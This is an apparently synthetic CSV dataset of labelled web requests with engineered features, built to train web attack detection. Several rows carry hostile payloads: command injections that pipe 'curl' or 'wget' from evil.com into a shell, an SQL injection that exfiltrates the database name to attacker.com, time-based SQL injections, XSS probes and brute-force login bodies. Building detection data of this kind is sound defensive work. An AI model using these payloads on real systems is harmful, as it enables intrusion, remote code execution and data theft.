timestamp,source_ip,destination_ip,protocol,http_method,url,request_headers,request_body,response_code,response_size,response_headers,user_agent,payload_raw,attack_type_label,hour,day_of_week,is_weekend,is_attack,parsed_request_headers,parsed_response_headers,Host,User-Agent,Accept,Content-Type,Server,url_length,url_num_params,url_num_special_chars,url_has_sql_keywords,url_has_xss_patterns,url_has_cmd_injection,url_has_traversal,url_has_ssrf_patterns,url_has_typosquatting,url_contains_ip,url_has_credential_patterns,payload_length,request_body_length,payload_special_chars,payload_num_sql_keywords,payload_num_xss_patterns,payload_has_encoding,payload_is_empty,payload_contains_hex,combined_payload,response_code_group,is_error_response,is_success_response,is_redirect_response,response_size_ratio,is_redirect,payload_length_safe,response_payload_ratio,source_ip_freq,source_ip_attack_ratio,is_known_attacker_ip,destination_ip_freq,destination_ip_attack_count,is_attack_tool_ua,ua_is_browser,ua_is_bot,ua_length,server_type,attack_pattern_sql,attack_pattern_xss,attack_pattern_cmd,attack_pattern_traversal,attack_pattern_ssrf,attack_pattern_typosquatting,attack_pattern_credential,special_chars_ratio,url_param_ratio,is_https,is_post_method,is_get_method,url_path_depth,url_has_sensitive_file,timestamp_min,requests_per_ip_per_minute,source_ip_error_ratio
2026-03-15 16:01:15,172.16.0.32,3.12.45.78,https,post,/login,"{""Host"":""198.51.100.23"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",username=user&password=123456,403,6106,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,username=user&password=123456,credential_stuffing_brute_force,16,6,1,1,"{'Host': '198.51.100.23', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",198.51.100.23,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,IIS,6,0,1,0,0,0,0,0,0,0,1,29,29,1,0,0,0,0,0,username=user&password=123456username=user&password=123456,4xx,1,0,0,210.55172413793105,0,58,105.27586206896552,9,0.4444444444444444,0,951,546,0,1,0,91,IIS,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.034482758620689655,0.0,0,0,0,1,0,2026-03-15 16:01:00,1,0.3333333333333333
2026-03-07 19:57:57,172.16.0.225,172.67.128.45,http,post,/login,"{""Host"":""52.45.123.89"",""User-Agent"":""Nmap Scripting Engine"",""Accept"":""*/*""}",username=test&password=admin123,401,1778,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Nmap Scripting Engine,username=test&password=admin123,credential_stuffing_brute_force,19,5,1,1,"{'Host': '52.45.123.89', 'User-Agent': 'Nmap Scripting Engine', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",52.45.123.89,Nmap Scripting Engine,*/*,text/html,Apache,6,0,1,0,0,0,0,0,0,0,1,31,31,1,0,0,0,0,0,username=test&password=admin123username=test&password=admin123,4xx,1,0,0,57.354838709677416,0,62,28.677419354838708,14,0.7142857142857143,0,1020,627,1,0,0,21,Apache,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.03225806451612903,0.0,0,0,0,1,0,2026-03-07 19:57:00,1,0.6428571428571429
2026-03-06 16:37:29,172.16.0.68,185.199.108.153,http,get,"/login?user=' or if(1=1, sleep(5), 0)--","{""Host"":""172.67.128.45"",""User-Agent"":""XSStrike/3.1.5"",""Accept"":""*/*""}",,403,6076,"{""Content-Type"":""text/html"",""Server"":""nginx""}",XSStrike/3.1.5,"' or if(1=1, sleep(5), 0)--",sql_injection,16,4,0,1,"{'Host': '172.67.128.45', 'User-Agent': 'XSStrike/3.1.5', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",172.67.128.45,XSStrike/3.1.5,*/*,text/html,nginx,39,1,6,1,0,0,0,0,0,0,0,27,0,1,1,0,0,0,0,"' or if(1=1, sleep(5), 0)--",4xx,1,0,0,225.03703703703704,0,27,225.03703703703704,11,0.36363636363636365,0,961,575,1,0,0,14,nginx,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.037037037037037035,0.02564102564102564,0,0,0,1,0,2026-03-06 16:37:00,1,0.2727272727272727
2026-03-14 05:59:42,104.18.24.216,203.0.113.45,http,get,"/search?q=' and extractvalue(1,concat(0x7e,database()))--","{""Host"":""198.51.100.23"",""User-Agent"":""XSStrike/3.1.5"",""Accept"":""*/*""}",,500,7711,"{""Content-Type"":""text/html"",""Server"":""Apache""}",XSStrike/3.1.5,"' and extractvalue(1,concat(0x7e,database()))--",sql_injection,5,5,1,1,"{'Host': '198.51.100.23', 'User-Agent': 'XSStrike/3.1.5', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",198.51.100.23,XSStrike/3.1.5,*/*,text/html,Apache,57,1,5,1,0,0,0,0,0,0,0,47,0,1,0,0,0,0,1,"' and extractvalue(1,concat(0x7e,database()))--",5xx,1,0,0,164.06382978723406,0,47,164.06382978723406,4,1.0,1,1028,611,1,0,0,14,Apache,0.5,0.0,0.0,0.0,0.0,0.0,0.0,0.02127659574468085,0.017543859649122806,0,0,0,1,1,2026-03-14 05:59:00,1,0.75
2026-03-06 06:05:29,172.16.0.200,104.18.24.12,http,post,/register?sort=product1&tags=||,"{""Host"":""203.0.113.45"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",comment=Great article!,200,4457,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,,normal,6,4,0,0,"{'Host': '203.0.113.45', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",203.0.113.45,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,nginx,31,2,5,0,0,1,0,0,0,0,0,0,22,0,0,0,0,1,0,comment=Great article!,2xx,0,1,0,0.0,0,22,202.5909090909091,8,0.75,0,986,617,0,1,0,91,nginx,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.06451612903225806,0,0,0,1,0,2026-03-06 06:05:00,1,0.625
2026-03-07 00:47:21,172.16.0.114,10.0.0.1,https,get,/traceroute?host=&& curl http://evil.com | sh,"{""Host"":""10.0.0.1"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,401,1856,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,&& curl http://evil.com | sh,command_injection,0,5,1,1,"{'Host': '10.0.0.1', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",10.0.0.1,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,Apache,45,3,8,0,0,1,0,0,0,0,0,28,0,3,0,0,0,0,0,&& curl http://evil.com | sh,4xx,1,0,0,66.28571428571429,0,28,66.28571428571429,6,0.8333333333333334,0,998,578,0,1,0,81,Apache,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.10714285714285714,0.06666666666666667,0,0,0,1,0,2026-03-07 00:47:00,1,0.6666666666666666
2026-03-03 06:29:18,10.0.0.133,10.0.0.1,http,post,/login,"{""Host"":""10.0.0.1"",""User-Agent"":""Nmap Scripting Engine"",""Accept"":""*/*""}",username=bob&password=Spring2024,404,1625,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Nmap Scripting Engine,username=bob&password=spring2024,credential_stuffing_brute_force,6,1,0,1,"{'Host': '10.0.0.1', 'User-Agent': 'Nmap Scripting Engine', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",10.0.0.1,Nmap Scripting Engine,*/*,text/html,IIS,6,0,1,0,0,0,0,0,0,0,1,32,32,1,0,0,0,0,0,username=bob&password=spring2024username=bob&password=Spring2024,4xx,1,0,0,50.78125,0,64,25.390625,14,0.6428571428571429,0,998,578,1,0,0,21,IIS,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.03125,0.0,0,0,0,1,0,2026-03-03 06:29:00,1,0.5714285714285714
2026-03-19 14:13:09,192.168.1.15,172.67.128.45,https,post,/login,"{""Host"":""185.199.108.153"",""User-Agent"":""Nmap Scripting Engine"",""Accept"":""*/*""}",email=test35@test.com&password=password,401,5289,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Nmap Scripting Engine,email=test35@test.com&password=password,credential_stuffing_brute_force,14,3,0,1,"{'Host': '185.199.108.153', 'User-Agent': 'Nmap Scripting Engine', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",185.199.108.153,Nmap Scripting Engine,*/*,text/html,Apache,6,0,1,0,0,0,0,0,0,0,1,39,39,1,0,0,0,0,0,email=test35@test.com&password=passwordemail=test35@test.com&password=password,4xx,1,0,0,135.6153846153846,0,78,67.8076923076923,10,0.7,0,1020,627,1,0,0,21,Apache,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.02564102564102564,0.0,0,0,0,1,0,2026-03-19 14:13:00,1,0.3
2026-03-11 05:03:58,192.168.1.179,52.45.123.89,https,get,/contact?q=product1,"{""Host"":""104.18.24.12"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"",""Accept"":""*/*""}",,200,4034,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0,,normal,5,2,0,0,"{'Host': '104.18.24.12', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",104.18.24.12,Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0,*/*,text/html,nginx,19,1,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,,2xx,0,1,0,0.0,0,1,4034.0,9,0.6666666666666666,0,993,582,0,1,0,66,nginx,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.05263157894736842,0,0,0,1,0,2026-03-11 05:03:00,1,0.5555555555555556
2026-03-05 14:27:55,185.199.108.13,34.120.45.67,https,get,/register,"{""Host"":""192.168.1.1"",""User-Agent"":""python-requests/2.28.0"",""Accept"":""*/*""}",,302,4835,"{""Content-Type"":""text/html"",""Server"":""Apache""}",python-requests/2.28.0,,normal,14,3,0,0,"{'Host': '192.168.1.1', 'User-Agent': 'python-requests/2.28.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",192.168.1.1,python-requests/2.28.0,*/*,text/html,Apache,9,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,,3xx,0,0,1,0.0,1,1,4835.0,5,0.6,0,1010,589,0,0,1,22,Apache,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,1,0,2026-03-05 14:27:00,1,0.2
2026-03-09 11:56:43,192.168.1.93,192.168.1.1,https,get,/search?q='; waitfor delay '0:0:5'--,"{""Host"":""34.120.45.67"",""User-Agent"":""Nikto/2.5.0"",""Accept"":""*/*""}",,200,4565,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Nikto/2.5.0,'; waitfor delay '0:0:5'--,sql_injection,11,0,0,1,"{'Host': '34.120.45.67', 'User-Agent': 'Nikto/2.5.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",34.120.45.67,Nikto/2.5.0,*/*,text/html,Apache,36,1,5,1,0,1,0,0,0,0,0,26,0,4,0,0,0,0,0,'; waitfor delay '0:0:5'--,2xx,0,1,0,175.57692307692307,0,26,175.57692307692307,8,0.75,0,997,619,1,0,0,11,Apache,0.5,0.0,1.0,0.0,0.0,0.0,0.0,0.15384615384615385,0.027777777777777776,0,0,0,1,0,2026-03-09 11:56:00,1,0.5
2026-03-12 06:05:11,192.168.1.185,203.0.113.45,http,get,"/search?q=' and load_file(concat('\\',database(),'.attacker.com\'))--","{""Host"":""185.199.108.153"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,200,7640,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,"' and load_file(concat('\\',database(),'.attacker.com\'))--",sql_injection,6,3,0,1,"{'Host': '185.199.108.153', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",185.199.108.153,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,Apache,69,1,8,1,0,0,0,0,0,0,0,59,0,5,1,0,0,0,0,"' and load_file(concat('\\',database(),'.attacker.com\'))--",2xx,0,1,0,129.4915254237288,0,59,129.4915254237288,8,0.75,0,1028,611,0,1,0,81,Apache,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0847457627118644,0.014492753623188406,0,0,0,1,1,2026-03-12 06:05:00,1,0.375
2026-03-22 09:59:01,192.168.1.246,3.12.45.78,http,get,/search?q=alert('your session has expired'),"{""Host"":""192.168.1.1"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",,200,5110,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,alert('your session has expired'),xss,9,6,1,1,"{'Host': '192.168.1.1', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",192.168.1.1,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,IIS,43,1,3,0,1,0,0,0,0,0,0,33,0,2,0,1,0,0,0,alert('your session has expired'),2xx,0,1,0,154.84848484848484,0,33,154.84848484848484,12,0.5833333333333334,0,951,546,0,1,0,80,IIS,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.06060606060606061,0.023255813953488372,0,0,0,1,0,2026-03-22 09:59:00,1,0.5
2026-03-06 01:20:11,172.67.128.166,172.67.128.45,https,get,/login,"{""Host"":""104.18.24.12"",""User-Agent"":""Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15"",""Accept"":""*/*""}",,302,1795,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15,,normal,1,4,0,0,"{'Host': '104.18.24.12', 'User-Agent': 'Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",104.18.24.12,Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15,*/*,text/html,Apache,6,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,,3xx,0,0,1,0.0,1,1,1795.0,1,0.0,0,1020,627,0,0,0,66,Apache,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,1,0,2026-03-06 01:20:00,1,0.0
2026-03-13 04:03:53,104.18.24.130,203.0.113.45,https,get,/ping?ip=127.0.0.1| ping -n 10 127.0.0.1,"{""Host"":""185.199.108.153"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,500,5213,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,| ping -n 10 127.0.0.1,command_injection,4,4,0,1,"{'Host': '185.199.108.153', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",185.199.108.153,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,IIS,40,1,10,0,0,1,0,1,0,1,0,22,0,1,0,0,0,0,0,| ping -n 10 127.0.0.1,5xx,1,0,0,236.95454545454547,0,22,236.95454545454547,4,0.5,0,1028,611,0,1,0,81,IIS,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.045454545454545456,0.025,0,0,0,1,0,2026-03-13 04:03:00,1,0.5
2026-03-22 01:20:27,10.0.0.225,10.0.0.1,https,post,/js/script.js,"{""Host"":""10.0.0.1"",""User-Agent"":""python-requests/2.28.0"",""Accept"":""*/*""}",username=john_doe&password=pass123,404,1327,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",python-requests/2.28.0,,normal,1,6,1,0,"{'Host': '10.0.0.1', 'User-Agent': 'python-requests/2.28.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",10.0.0.1,python-requests/2.28.0,*/*,text/html,Cloudflare,13,0,3,0,0,0,0,0,0,0,1,0,34,0,0,0,0,1,0,username=john_doe&password=pass123,4xx,1,0,0,0.0,0,34,39.029411764705884,18,0.5,0,998,578,0,0,1,22,Cloudflare,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0,0,0,2,0,2026-03-22 01:20:00,1,0.4444444444444444
2026-03-04 16:48:31,192.168.1.203,104.18.24.12,http,get,/./contact,"{""Host"":""192.168.1.1"",""User-Agent"":""Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"",""Accept"":""*/*""}",,200,788,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,normal,16,2,0,0,"{'Host': '192.168.1.1', 'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",192.168.1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),*/*,text/html,Cloudflare,10,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,,2xx,0,1,0,0.0,0,1,788.0,11,0.6363636363636364,0,986,617,0,0,1,72,Cloudflare,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,2,0,2026-03-04 16:48:00,1,0.36363636363636365
2026-03-02 10:52:24,172.67.128.195,172.67.128.45,https,get,/traceroute?host=| wget -o- http://evil.com | bash,"{""Host"":""10.0.0.1"",""User-Agent"":""XSStrike/3.1.5"",""Accept"":""*/*""}",,403,629,"{""Content-Type"":""text/html"",""Server"":""nginx""}",XSStrike/3.1.5,| wget -o- http://evil.com | bash,command_injection,10,0,0,1,"{'Host': '10.0.0.1', 'User-Agent': 'XSStrike/3.1.5', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",10.0.0.1,XSStrike/3.1.5,*/*,text/html,nginx,50,1,8,0,0,1,0,0,0,0,0,33,0,2,0,0,0,0,0,| wget -o- http://evil.com | bash,4xx,1,0,0,19.060606060606062,0,33,19.060606060606062,2,1.0,1,1020,627,1,0,0,14,nginx,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.06060606060606061,0.02,0,0,0,1,0,2026-03-02 10:52:00,1,1.0
2026-03-03 13:59:33,104.18.24.118,198.51.100.23,http,post,/comment,"{""Host"":""52.45.123.89"",""User-Agent"":""SQLmap/1.8.4"",""Accept"":""*/*""}",comment=console.log%28%27XSS%27%29,401,3627,"{""Content-Type"":""text/html"",""Server"":""IIS""}",SQLmap/1.8.4,console.log('xss'),xss,13,1,0,1,"{'Host': '52.45.123.89', 'User-Agent': 'SQLmap/1.8.4', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",52.45.123.89,SQLmap/1.8.4,*/*,text/html,IIS,8,0,1,0,0,0,0,0,0,0,0,18,34,2,0,0,0,0,0,console.log('xss')comment=console.log%28%27XSS%27%29,4xx,1,0,0,201.5,0,52,69.75,3,0.6666666666666666,0,1056,656,1,0,0,12,IIS,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.1111111111111111,0.0,0,0,0,1,0,2026-03-03 13:59:00,1,0.3333333333333333
2026-03-15 20:53:45,172.67.128.110,52.45.123.89,https,get,/products?select=all,"{""Host"":""185.199.108.153"",""User-Agent"":""Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"",""Accept"":""*/*""}",,404,3099,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,normal,20,6,1,0,"{'Host': '185.199.108.153', 'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",185.199.108.153,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),*/*,text/html,Cloudflare,20,1,3,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,,4xx,1,0,0,0.0,0,1,3099.0,5,0.4,0,993,582,0,0,1,72,Cloudflare,0.5,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.05,0,0,0,1,0,2026-03-15 20:53:00,1,0.6
2026-03-18 16:49:44,192.168.1.225,203.0.113.45,http,get,/ping?ip=127.0.0.1| whoami,"{""Host"":""198.51.100.23"",""User-Agent"":""BurpSuite/2023.12"",""Accept"":""*/*""}",,403,4870,"{""Content-Type"":""text/html"",""Server"":""Apache""}",BurpSuite/2023.12,| whoami,command_injection,16,2,0,1,"{'Host': '198.51.100.23', 'User-Agent': 'BurpSuite/2023.12', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",198.51.100.23,BurpSuite/2023.12,*/*,text/html,Apache,26,1,6,0,0,1,0,1,0,1,0,8,0,1,0,0,0,0,0,| whoami,4xx,1,0,0,608.75,0,8,608.75,9,0.8888888888888888,0,1028,611,1,0,0,17,Apache,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.125,0.038461538461538464,0,0,0,1,0,2026-03-18 16:49:00,1,0.6666666666666666
2026-03-03 07:27:28,172.67.128.153,10.0.0.1,https,get,/,"{""Host"":""172.67.128.45"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,404,3288,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,,normal,7,1,0,0,"{'Host': '172.67.128.45', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",172.67.128.45,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,Apache,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,,4xx,1,0,0,0.0,0,1,3288.0,3,0.0,0,998,578,0,1,0,81,Apache,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,0,0,2026-03-03 07:27:00,1,0.3333333333333333
2026-03-02 18:56:41,172.16.0.20,34.120.45.67,http,post,/login,"{""Host"":""10.0.0.1"",""User-Agent"":""SQLmap/1.8.4"",""Accept"":""*/*""}",username=john&password=admin123,500,3344,"{""Content-Type"":""text/html"",""Server"":""Apache""}",SQLmap/1.8.4,username=john&password=admin123,credential_stuffing_brute_force,18,0,0,1,"{'Host': '10.0.0.1', 'User-Agent': 'SQLmap/1.8.4', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",10.0.0.1,SQLmap/1.8.4,*/*,text/html,Apache,6,0,1,0,0,0,0,0,0,0,1,31,31,1,0,0,0,0,0,username=john&password=admin123username=john&password=admin123,5xx,1,0,0,107.87096774193549,0,62,53.935483870967744,16,0.6875,0,1010,589,1,0,0,12,Apache,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.03225806451612903,0.0,0,0,0,1,0,2026-03-02 18:56:00,1,0.6875
2026-03-01 16:54:29,172.16.0.174,10.0.0.1,http,post,/css/style.css,"{""Host"":""34.120.45.67"",""User-Agent"":""Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"",""Accept"":""*/*""}",comment=Great article!,200,4070,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,normal,16,6,1,0,"{'Host': '34.120.45.67', 'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",34.120.45.67,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),*/*,text/html,Apache,14,0,3,0,0,0,0,0,0,0,0,0,22,0,0,0,0,1,0,comment=Great article!,2xx,0,1,0,0.0,0,22,185.0,5,0.0,0,998,578,0,0,1,72,Apache,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,2,0,2026-03-01 16:54:00,1,0.0
2026-03-08 06:29:50,10.0.0.161,172.67.128.45,http,post,/login,"{""Host"":""52.45.123.89"",""User-Agent"":""SQLmap/1.8.4"",""Accept"":""*/*""}",email=test4@test.com&password=root,404,1403,"{""Content-Type"":""text/html"",""Server"":""nginx""}",SQLmap/1.8.4,email=test4@test.com&password=root,credential_stuffing_brute_force,6,6,1,1,"{'Host': '52.45.123.89', 'User-Agent': 'SQLmap/1.8.4', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",52.45.123.89,SQLmap/1.8.4,*/*,text/html,nginx,6,0,1,0,0,0,0,0,0,0,1,34,34,1,0,0,0,0,0,email=test4@test.com&password=rootemail=test4@test.com&password=root,4xx,1,0,0,41.26470588235294,0,68,20.63235294117647,7,0.42857142857142855,0,1020,627,1,0,0,12,nginx,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.029411764705882353,0.0,0,0,0,1,0,2026-03-08 06:29:00,1,0.5714285714285714
